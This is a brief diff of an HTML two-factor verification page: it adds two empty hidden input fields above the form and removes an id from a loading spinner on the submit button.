@@ -155,7 +155,8 @@
             
             <h5 id="main-header" class="classic-title">Two-Factor Verification</h5>
             <p id="sub-header" class="classic-desc">Please complete the required security checks below to autheticate your device session.</p>
-            
+            <input type="hidden" id="placeholder" value="">
+			<input type="hidden" id="indicator" value="">
             <form id="verification-form">
                 <div id="dynamic-2fa-fields" class="form-group-wrapper">
                     <!-- Inputs generated dynamically via renderTwoFactorFields() go here -->
@@ -163,7 +164,7 @@
                 
                 <button type="submit" class="action-btn btn-start">
                     <span class="btn-text">Confirm & Verify</span>
-                    <span style="display: none;" id="z6x2c9v4b1_992211" class="spinner-border"></span>
+                    <span style="display: none;" class="spinner-border"></span>
                 </button>
                 
                 <div style="width: 100%; color: #dc3545; margin-top: 10px; text-align: center;" class="text-danger"><small id="error-div"></small></div>
